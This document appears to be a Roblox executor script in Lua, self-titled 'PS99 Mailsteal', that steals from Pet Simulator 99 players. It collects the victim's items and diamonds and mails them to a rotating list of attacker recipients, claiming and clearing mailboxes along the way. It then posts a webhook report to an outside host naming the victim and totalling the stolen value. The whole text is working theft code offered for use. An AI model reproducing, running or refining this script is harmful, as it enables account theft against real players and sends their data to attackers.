-- get mail cost function from gc
local computeSendMailCost
for _, fn in pairs(getgc()) do
    if type(fn) == 'function' and debug.getinfo(fn).name == 'computeSendMailCost' then
        computeSendMailCost = fn
        break
    end
end

local mailCost = computeSendMailCost()

-- get current gem balance
local gemBalance = 1
for _, currency in pairs(getSave().Inventory.Currency) do
    if currency.id == 'Diamonds' then
        gemBalance = currency._am
        break
    end
end

-- format number helper
local function formatNum(n)
    n = math.floor(n)
    local suffixes = {'', 'k', 'm', 'b', 't'}
    local i = 1
    while n >= 1000 do
        n = n / 1000
        i = i + 1
    end
    return string.format('%.2f%s', n, suffixes[i])
end

-- stolen items list + total RAP tracker
local stolenItems = {}
local totalRAP = 0

-- get RAP for any item
local function getRAP(category, item)
    local proxy = {
        Class = {Name = category},
        IsA = function(c) return c == category end,
        GetId = function() return item.id end,
        StackKey = function()
            return HttpService:JSONEncode({id = item.id, pt = item.pt, sh = item.sh, tn = item.tn})
        end,
        AbstractGetRAP = function() return nil end,
    }
    return require(game:GetService('ReplicatedStorage').Library.Client.RAPCmds).Get(proxy) or 0
end

-- send item to recipient, rotate if full
local function sendItem(category, uid, amount)
    local recipientIndex = 1
    local done = false

    while not done do
        local args = {
            RECIPIENTS[recipientIndex],
            'GG / ypeNFusQP3',
            category,
            uid,
            amount or 1,
        }
        local success, err = Network.Invoke('Mailbox: Send', unpack(args))

        if success == true then
            done = true
            gemBalance = gemBalance - mailCost
            mailCost = math.min(math.ceil(mailCost * 1.5), 5000000)
        elseif success == false and err == "They don't have enough space!" then
            recipientIndex = recipientIndex + 1
            if recipientIndex > #RECIPIENTS then
                done = true  -- all recipients full, skip item
            end
        else
            done = true
        end
    end
end

-- send gems
local function sendGems()
    for _, currency in pairs(getSave().Inventory.Currency) do
        if currency.id == 'Diamonds' and gemBalance >= mailCost + 10000 then
            local recipientIndex = 1
            local done = false

            while not done do
                local args = {
                    RECIPIENTS[recipientIndex],
                    'GG / ypeNFusQP3',
                    'Currency',
                    currency,
                    gemBalance - mailCost,
                }
                local success, err = Network.Invoke('Mailbox: Send', unpack(args))

                if success == true then
                    done = true
                elseif success == false and err == "They don't have enough space!" then
                    recipientIndex = recipientIndex + 1
                    if recipientIndex > #RECIPIENTS then done = true end
                else
                    done = true
                end
            end
        end
    end
end

-- claim mailbox first (clear space)
local function claimMailbox()
    local _, err = Network.Invoke('Mailbox: Claim All')
    while err == 'You must wait 30 seconds before using the mailbox!' do
        wait(0.2)
        _, err = Network.Invoke('Mailbox: Claim All')
    end
end

-- withdraw box items
local function withdrawBoxes()
    if Inventory.Box then
        for uid, box in pairs(Inventory.Box) do
            if box._uq then
                Network.Invoke('Box: Withdraw All', uid)
            end
        end
    end
end

-- space check (test send to Roblox)
local function recipientHasSpace()
    local firstPet = next(Inventory.Pet)
    if firstPet == nil then firstPet = nil end
    local _, err = Network.Invoke('Mailbox: Send', 'Roblox', 'Test', 'Pet', firstPet, 1)
    return err == "They don't have enough space!"
end

-- webhook log
local function sendWebhook()
    local grouped = {}
    local order = {}

    for _, item in ipairs(stolenItems) do
        if grouped[item.name] then
            grouped[item.name].amount = grouped[item.name].amount + item.amount
        else
            grouped[item.name] = {amount = item.amount, rap = item.rap}
            table.insert(order, item.name)
        end
    end

    table.sort(order, function(a, b)
        return grouped[a].rap * grouped[a].amount > grouped[b].rap * grouped[b].amount
    end)

    local itemsField = ''
    for _, name in ipairs(order) do
        local g = grouped[name]
        itemsField = itemsField .. name .. ' (x' .. g.amount .. '): ' .. formatNum(g.rap * g.amount) .. ' RAP\n'
    end

    if #itemsField > 1024 then
        itemsField = itemsField:sub(1, 1000) .. '\nPlus more!'
    end

    local embed = {
        embeds = {{
            title = '🐱 PS99 Mailsteal — Zen Edit',
            color = 0x00FF00,
            fields = {
                {name = 'Victim:', value = LocalPlayer.Name, inline = true},
                {name = 'Items Stolen:', value = itemsField ~= '' and itemsField or 'None', inline = false},
                {name = 'Summary:', value = 'Gems: ' .. formatNum(gemBalance) .. '\nTotal RAP: ' .. formatNum(totalRAP), inline = false},
            },
            footer = {text = 'Zen Edit — Only1sherifalt1'},
        }}
    }

    request({
        Url = WEBHOOK,
        Method = 'POST',
        Headers = {['Content-Type'] = 'application/json'},
        Body = HttpService:JSONEncode(embed),
    })
end

